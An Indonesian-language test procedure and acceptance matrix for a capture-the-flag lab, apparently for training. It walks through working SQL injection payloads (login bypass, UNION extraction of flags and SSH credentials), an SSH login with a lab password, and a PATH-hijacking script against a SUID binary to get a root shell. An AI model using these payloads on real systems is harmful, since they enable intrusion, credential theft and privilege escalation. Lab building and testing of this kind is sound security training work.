# Prosedur Pengujian dan Verifikasi Lab

Dokumen ini memuat panduan pengujian menyeluruh (End-to-End) dan matriks kriteria penerimaan untuk lab **SQL Injection to Root Privilege Escalation**.

---

## 1. Matriks Kriteria Penerimaan

| Kategori | Kriteria Pengujian | Status | Verifikasi |
|---|---|---|---|
| **Web** | Halaman `/login/` dapat diakses dan merender form autentikasi | Memenuhi | HTTP GET `/login/` -> 200 OK |
| **Web** | SQL Injection login bypass berhasil dengan payload `' OR 1=1 --` atau `admin' --` | Memenuhi | HTTP POST `/login/` -> 302 Redirect ke `/dashboard/` |
| **Web** | Dashboard menampilkan Flag 1 (`FLAG{SQLI_LOGIN_BYPASS}`) | Memenuhi | String `FLAG{SQLI_LOGIN_BYPASS}` muncul di HTML |
| **Web** | Halaman katalog `/products/` dapat diakses dan merender kategori | Memenuhi | HTTP GET `/products/` -> 200 OK |
| **Web** | Parameter `category` rentan terhadap UNION-based SQL Injection | Memenuhi | Payload UNION mengembalikan data kolom arbitrary |
| **Database** | Tabel `products`, `categories`, `challenge_flags`, dan `system_credentials` ada | Memenuhi | Dikonfirmasi via schema PostgreSQL |
| **Database** | Flag 2 (`FLAG{DATABASE_ENUMERATION}`) dapat diekstrak via SQLi | Memenuhi | `category=1 UNION SELECT 1, stage, flag_value, 0, 1 FROM challenge_flags--` |
| **Database** | Kredensial SSH `student` dapat diekstrak via SQLi | Memenuhi | `category=1 UNION SELECT 1, username, credential_value, 0, 1 FROM system_credentials--` |
| **Database** | Port PostgreSQL tidak diekspos ke host Docker | Memenuhi | Port 5432 tidak listening pada host |
| **SSH & OS** | User `student` dapat login melalui SSH dengan kredensial dari database | Memenuhi | `ssh student@localhost -p 2223` berhasil |
| **SSH & OS** | User `student` bukan root dan tidak memiliki hak istimewa penuh | Memenuhi | UID 1000, `sudo` tidak aktif tanpa password |
| **SSH & OS** | User flag (`FLAG{USER_SHELL_ACQUIRED}`) dapat dibaca oleh student | Memenuhi | `cat /home/student/user.flag` |
| **Privesc** | Flag root (`FLAG{ROOT_COMPROMISED}`) tidak dapat dibaca oleh student | Memenuhi | `cat /root/root.flag` -> Permission Denied |
| **Privesc** | Binary SUID `/usr/local/bin/syshealth` dapat ditemukan via enumerasi | Memenuhi | `find / -perm -4000 2>/dev/null` |
| **Privesc** | PATH Hijacking menghasilkan root shell dan Flag 4 | Memenuhi | Eksekusi `/usr/local/bin/syshealth` dengan payload PATH |
| **Admin** | Administrator host dapat memperoleh root shell via Docker API | Memenuhi | `docker compose exec -u 0 web /bin/bash` |
| **Operasional** | Script reset mengembalikan kondisi awal secara konsisten | Memenuhi | Eksekusi `./reset.sh` |

---

## 2. Prosedur Pengujian Manual Langkah demi Langkah

### Langkah 1: Pengujian Web Login (Tahap 1)
1. Akses web portal di `http://localhost:8000/login/`.
2. Masukkan username payload bypass:
   ```text
   admin' --
   ```
   Password dapat diisi string apa saja (misal: `test`).
3. Verifikasi browser dialihkan ke `http://localhost:8000/dashboard/`.
4. Pastikan flag tampil di layar:
   ```text
   FLAG{SQLI_LOGIN_BYPASS}
   ```

### Langkah 2: Enumerasi Database via Produk (Tahap 2)
1. Buka `http://localhost:8000/products/`.
2. Uji injeksi deteksi error:
   ```text
   http://localhost:8000/products/?category=1'
   ```
   Pastikan pesan error PostgreSQL muncul di halaman.
3. Ekstraksi Flag 2 dari tabel `challenge_flags`:
   ```text
   http://localhost:8000/products/?category=1%20UNION%20SELECT%201,%20stage,%20flag_value,%200,%201%20FROM%20challenge_flags--
   ```
   Amati bahwa `FLAG{DATABASE_ENUMERATION}` muncul di kolom deskripsi produk.
4. Ekstraksi Kredensial SSH dari tabel `system_credentials`:
   ```text
   http://localhost:8000/products/?category=1%20UNION%20SELECT%201,%20username,%20credential_value,%200,%201%20FROM%20system_credentials--
   ```
   Temukan baris:
   - Identifier: `student`
   - Nilai: `student_ctf_p4ssw0rd!`

### Langkah 3: Akses SSH dan Flag User (Tahap 3)
1. Hubungi OpenSSH server dari host:
   ```bash
   ssh -o StrictHostKeyChecking=no student@localhost -p 2223
   ```
2. Masukkan password: `student_ctf_p4ssw0rd!`.
3. Setelah masuk, baca user flag:
   ```bash
   cat /home/student/user.flag
   ```
   Nilai: `FLAG{USER_SHELL_ACQUIRED}`.
4. Pastikan student tidak dapat membaca root flag secara langsung:
   ```bash
   cat /root/root.flag
   ```
   Hasil: `Permission denied`.

### Langkah 4: Privilege Escalation ke Root (Tahap 4)
1. Cari file dengan SUID bit menyala:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
   Hasil menunjukkan `/usr/local/bin/syshealth`.
2. Periksa string biner:
   ```bash
   strings /usr/local/bin/syshealth | grep healthcheck
   ```
   Terlihat pemanggilan langsung string `healthcheck` tanpa path absolut.
3. Buat file `healthcheck` palsu di `/tmp`:
   ```bash
   cat << 'EOF' > /tmp/healthcheck
   #!/bin/bash
   cat /root/root.flag > /tmp/root_flag.txt
   chmod 644 /tmp/root_flag.txt
   /bin/bash
   EOF
   chmod +x /tmp/healthcheck
   ```
4. Tambahkan `/tmp` ke urutan pertama `PATH`:
   ```bash
   export PATH=/tmp:$PATH
   ```
5. Jalankan binary SUID:
   ```bash
   /usr/local/bin/syshealth
   ```
6. Verifikasi identitas:
   ```bash
   whoami
   ```
   Output: `root`.
7. Baca root flag:
   ```bash
   cat /root/root.flag
   ```
   Nilai: `FLAG{ROOT_COMPROMISED}`.

### Langkah 5: Verifikasi Akses Root Administrator
Dari mesin host, administrator dapat langsung memperoleh akses root tanpa melalui alur eksploitasi:
```bash
docker compose exec -u 0 web /bin/bash
```
Periksa shell:
```bash
whoami
# Output: root
```
